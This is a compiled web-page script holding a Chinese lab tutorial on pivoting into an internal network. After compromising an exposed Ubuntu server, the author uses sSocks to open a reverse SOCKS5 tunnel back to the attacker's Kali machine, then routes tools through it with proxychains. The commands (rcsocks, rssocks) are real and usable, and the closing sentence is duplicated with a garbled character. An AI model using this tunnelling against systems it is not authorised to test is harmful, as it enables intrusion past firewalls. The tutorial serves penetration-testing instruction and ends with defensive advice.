(window.webpackJsonp=window.webpackJsonp||[]).push([[63],{506:function(s,a,t){"use strict";t.r(a);var e=t(2),r=Object(e.a)({},(function(){var s=this,a=s.$createElement,t=s._self._c||a;return t("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[t("div",{staticClass:"custom-block tip"},[t("p",{staticClass:"custom-block-title"},[s._v("前言")]),s._v(" "),t("p",[s._v("对于渗透测试者来说, 如何绕过防火墙的阻挡在内网展开渗透测试成为需解决的问题, 本文介绍了在夺取映射到外网的内网服务器权限后, 如何利用 Socks 代理反弹获得内网访问权限")])]),s._v(" "),t("h2",{attrs:{id:"环境介绍"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#环境介绍"}},[s._v("#")]),s._v(" 环境介绍")]),s._v(" "),t("table",[t("thead",[t("tr",[t("th",[s._v("机子")]),s._v(" "),t("th",[s._v("系统")]),s._v(" "),t("th",[s._v("IP")])])]),s._v(" "),t("tbody",[t("tr",[t("td",[s._v("攻击机")]),s._v(" "),t("td",[t("code",[s._v("kali Liunx")])]),s._v(" "),t("td",[s._v("192.168.199.130 (外网)")])]),s._v(" "),t("tr",[t("td",[s._v("目标主机")]),s._v(" "),t("td",[t("code",[s._v("ubuntu-server")])]),s._v(" "),t("td",[s._v("192.168.199.131 (外网)；192.168.235.143 (内网)")])]),s._v(" "),t("tr",[t("td",[s._v("内网主机")]),s._v(" "),t("td",[t("code",[s._v("Metasploitable2-Liunx")])]),s._v(" "),t("td",[s._v("192.168.235.142 (内网)")])])])]),s._v(" "),t("h2",{attrs:{id:"工具介绍"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#工具介绍"}},[s._v("#")]),s._v(" 工具介绍")]),s._v(" "),t("h3",{attrs:{id:"ssocks"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#ssocks"}},[s._v("#")]),s._v(" sSocks")]),s._v(" "),t("p",[s._v("sSocks 是一个 socks 代理工具套装, 可用来开启 socks 代理服务, 支持 socks5 验证, 支持 IPV6 和 UDP, 并提供反向 socks 代理服务, 即将远程计算机作为 socks 代理服务端, 反弹回本地, 极大方便内网的渗透测试")]),s._v(" "),t("h3",{attrs:{id:"下载"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#下载"}},[s._v("#")]),s._v(" 下载")]),s._v(" "),t("p",[t("a",{attrs:{href:"http://sourceforge.net/projects/ssocks/",target:"_blank",rel:"noopener noreferrer"}},[s._v("sSocks 更新地址"),t("OutboundLink")],1),t("br"),s._v("\n这里下载的版本为 "),t("code",[s._v("0.0.14")])]),s._v(" "),t("div",{staticClass:"language-bash line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-bash"}},[t("code",[t("span",{pre:!0,attrs:{class:"token function"}},[s._v("wget")]),s._v(" https://nchc.dl.sourceforge.net/project/ssocks/ssocks-0.0.14.tar.gz\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br")])]),t("h3",{attrs:{id:"解压并编译"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#解压并编译"}},[s._v("#")]),s._v(" 解压并编译")]),s._v(" "),t("div",{staticClass:"language-bash line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-bash"}},[t("code",[t("span",{pre:!0,attrs:{class:"token function"}},[s._v("tar")]),s._v(" -xzvf ssocks-0.0.14.tar.gz\n"),t("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("cd")]),s._v(" ssocks-0.0.14\n./configure "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("&&")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token function"}},[s._v("make")]),s._v("\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br"),t("span",{staticClass:"line-number"},[s._v("2")]),t("br"),t("span",{staticClass:"line-number"},[s._v("3")]),t("br")])]),t("div",{staticClass:"custom-block warning"},[t("p",{staticClass:"custom-block-title"},[s._v("注意")]),s._v(" "),t("p",[s._v("编译的时候要先确定机子上有 gcc 环境, 没有的请自行安装")])]),s._v(" "),t("h3",{attrs:{id:"功能"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#功能"}},[s._v("#")]),s._v(" 功能")]),s._v(" "),t("p",[s._v("编译完成, 进入 sr c 目录, 会发现有 "),t("code",[s._v("nsocks")]),s._v(" 、 "),t("code",[s._v("ssocksd")]),s._v(" 、 "),t("code",[s._v("ssocks")]),s._v(" 、 "),t("code",[s._v("rcsocks")]),s._v(" , 其功能说明介绍如下:")]),s._v(" "),t("ul",[t("li",[t("strong",[s._v("nsocks")]),s._v(" 类似通过 Socks5 代理后的 netcat, 可用来测试 socks server")]),s._v(" "),t("li",[t("strong",[s._v("ssocksd")]),s._v(" 用来开启 Socks5 代理服务")]),s._v(" "),t("li",[t("strong",[s._v("ssocks")]),s._v(" 本地启用 Socks5 服务, 并反弹到另一 IP 地址")]),s._v(" "),t("li",[t("strong",[s._v("rcsocks")]),s._v(" 接收反弹过来的 Socks5 服务, 并转向另一端口")])]),s._v(" "),t("h2",{attrs:{id:"攻击步骤"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#攻击步骤"}},[s._v("#")]),s._v(" 攻击步骤")]),s._v(" "),t("p",[s._v("现假设已获得 "),t("code",[s._v("ubuntu-server")]),s._v(" 权限, 也将 ssocks 这软件上传至该服务器（包含解压和编译）")]),s._v(" "),t("h3",{attrs:{id:"执行本地监听"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#执行本地监听"}},[s._v("#")]),s._v(" 执行本地监听")]),s._v(" "),t("p",[s._v("机子: "),t("code",[s._v("kali Liunx")]),s._v(" ；IP: "),t("code",[s._v("192.168.199.130")])]),s._v(" "),t("div",{staticClass:"language-bash line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-bash"}},[t("code",[t("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("cd")]),s._v(" ssocks-0.0.14/src\n./rcsocks -l "),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("1088")]),s._v(" -p "),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("1080")]),s._v(" -vv\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br"),t("span",{staticClass:"line-number"},[s._v("2")]),t("br")])]),t("p",[s._v("等待远程 Socks5 服务器访问本地 1080 端口, 创建端口 1080 与本地端口 1088 的连接通道"),t("br")]),s._v(" "),t("p",[t("img",{attrs:{src:"http://oss-blog.test.upcdn.net/socks-proxy-1.png",alt:"Socks 代理"}})]),s._v(" "),t("h3",{attrs:{id:"开启-socks5-代理服务-反弹"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#开启-socks5-代理服务-反弹"}},[s._v("#")]),s._v(" 开启 Socks5 代理服务, 反弹")]),s._v(" "),t("p",[s._v("机子: "),t("code",[s._v("ubuntu-server")]),s._v(" ；IP: "),t("code",[s._v("192.168.199.131")])]),s._v(" "),t("div",{staticClass:"language-bash line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-bash"}},[t("code",[t("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("cd")]),s._v(" ssocks-0.0.14/src\n./rssocks -vv -s "),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("192.168")]),s._v(".199.130:1080\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br"),t("span",{staticClass:"line-number"},[s._v("2")]),t("br")])]),t("p",[s._v("启用 Socks5 服务, 反弹到 "),t("code",[s._v("192.168.199.130")]),s._v(" （即 "),t("code",[s._v("kali Liunx")]),s._v(" ） 的端口 1080 上"),t("br")]),s._v(" "),t("p",[t("img",{attrs:{src:"http://oss-blog.test.upcdn.net/socks-proxy-2.png",alt:"Socks 代理"}})]),s._v(" "),t("p",[s._v("此时在渗透测试端 "),t("code",[s._v("192.168.199.130")]),s._v(" （即 "),t("code",[s._v("kali Liunx")]),s._v(" ） 可看到通道连接成功"),t("br")]),s._v(" "),t("p",[t("img",{attrs:{src:"http://oss-blog.test.upcdn.net/socks-proxy-3.png",alt:"Socks 代理"}})]),s._v(" "),t("h3",{attrs:{id:"利用-proxychains-进行-socks5-代理"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#利用-proxychains-进行-socks5-代理"}},[s._v("#")]),s._v(" 利用 proxychains 进行 Socks5 代理")]),s._v(" "),t("p",[s._v("机子: "),t("code",[s._v("kali Liunx")]),s._v(" ；IP: "),t("code",[s._v("192.168.199.130")])]),s._v(" "),t("h4",{attrs:{id:"proxychains-介绍"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#proxychains-介绍"}},[s._v("#")]),s._v(" proxychains 介绍")]),s._v(" "),t("p",[s._v("通过前面的步骤, Socks5 代理已创建完成了。由于在渗透测试过程中, 需要使用不同的工具程序, 而在各程序中分别配置 Socks5 代理信息较为繁琐, 而部分程序并不支持配置 Socks5 代理。为了简化这些操作, 我们可以采用 "),t("code",[s._v("proxychains")]),s._v(" 。")]),s._v(" "),t("p",[s._v("proxychains 是一个代理客户端软件, 可以支持几乎所有程序的代理, 如 "),t("code",[s._v("ssh")]),s._v(" , "),t("code",[s._v("telnet")]),s._v(" , "),t("code",[s._v("ftp")]),s._v(" 等。利用 "),t("code",[s._v("proxychains")]),s._v(" , 程序能在代理的环境下被加载运行, 而本身不需要具备代理功能。")]),s._v(" "),t("h4",{attrs:{id:"proxychains-下载"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#proxychains-下载"}},[s._v("#")]),s._v(" proxychains 下载")]),s._v(" "),t("p",[s._v("需要 git 环境, 在 "),t("code",[s._v("kali Liunx")]),s._v(" 使用 "),t("code",[s._v("proxychains")])]),s._v(" "),t("div",{staticClass:"language-bash line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-bash"}},[t("code",[t("span",{pre:!0,attrs:{class:"token function"}},[s._v("git")]),s._v(" clone https://github.com/haad/proxychains.git\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br")])]),t("h4",{attrs:{id:"编译和安装"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#编译和安装"}},[s._v("#")]),s._v(" 编译和安装")]),s._v(" "),t("div",{staticClass:"language-bash line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-bash"}},[t("code",[t("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("cd")]),s._v(" proxychains\n./configure\n"),t("span",{pre:!0,attrs:{class:"token function"}},[s._v("make")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("&&")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token function"}},[s._v("make")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token function"}},[s._v("install")]),s._v("\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br"),t("span",{staticClass:"line-number"},[s._v("2")]),t("br"),t("span",{staticClass:"line-number"},[s._v("3")]),t("br")])]),t("h4",{attrs:{id:"修改配置文件"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#修改配置文件"}},[s._v("#")]),s._v(" 修改配置文件")]),s._v(" "),t("p",[s._v("使用前需要对 proxychains 进行简单配置, 打开配置文件 "),t("code",[s._v("/etc/proxychains.conf")])]),s._v(" "),t("p",[s._v("在 "),t("code",[s._v("[ProxyList]")]),s._v(" 处添加")]),s._v(" "),t("div",{staticClass:"language-bash line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-bash"}},[t("code",[s._v("socks5 "),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("127.0")]),s._v(".0.1 "),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("1088")]),s._v("\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br")])]),t("p",[t("img",{attrs:{src:"http://oss-blog.test.upcdn.net/socks-proxy-4.png",alt:"Socks 代理"}})]),s._v(" "),t("p",[s._v("配置成功后若要启动程序, 仅需要在启动程序命令前加上 "),t("code",[s._v("proxychains")])]),s._v(" "),t("h3",{attrs:{id:"启用浏览器-firefox"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#启用浏览器-firefox"}},[s._v("#")]),s._v(" 启用浏览器 firefox")]),s._v(" "),t("p",[s._v("机子: "),t("code",[s._v("kali Liunx")]),s._v(" ；IP: "),t("code",[s._v("192.168.199.130")])]),s._v(" "),t("div",{staticClass:"language-bash line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-bash"}},[t("code",[s._v("proxychains firefox\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br")])]),t("p",[t("img",{attrs:{src:"http://oss-blog.test.upcdn.net/socks-proxy-5.png",alt:"Socks 代理"}})]),s._v(" "),t("h3",{attrs:{id:"访问内网机子"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#访问内网机子"}},[s._v("#")]),s._v(" 访问内网机子")]),s._v(" "),t("p",[s._v("机子: "),t("code",[s._v("kali Liunx")]),s._v(" ；IP: "),t("code",[s._v("192.168.235.143")])]),s._v(" "),t("div",{staticClass:"custom-block warning"},[t("p",{staticClass:"custom-block-title"},[s._v("注意")]),s._v(" "),t("p",[s._v("现在已经可以直接访问内网主机了, IP: "),t("code",[s._v("192.168.235.142")])])]),s._v(" "),t("p",[t("img",{attrs:{src:"http://oss-blog.test.upcdn.net/socks-proxy-6.png",alt:"Socks 代理"}})]),s._v(" "),t("p",[s._v("随便点个链接, 然后再看一眼 "),t("code",[s._v("ubuntu-server")]),s._v(" 中的日志, 成功访问到内网中的页面"),t("br")]),s._v(" "),t("p",[t("img",{attrs:{src:"http://oss-blog.test.upcdn.net/socks-proxy-7.png",alt:"Socks 代理"}})]),s._v(" "),t("h2",{attrs:{id:"后记"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#后记"}},[s._v("#")]),s._v(" 后记")]),s._v(" "),t("p",[s._v("由于系统管理员的疏忽或者业务需求所致, 防火墙一般仅对由外向内发起的数据连接进行严格判断、过滤、甚至阻断而忽略由内往外的连接。因此, 在此种情况下, 通过攻陷映射到公网的端口服务, 利用反弹便可获取内网访问权限, 给内网安全带来极大的威胁。在信息安全建设与运维过程中, 不仅要加强映射到公网的服务安全, 也要重视由内到外连接的安全威胁 � 维过程中, 不仅要加强映射到公网的服务安全, 也要重视由内到外连接的安全威胁")])])}),[],!1,null,null,null);a.default=r.exports}}]);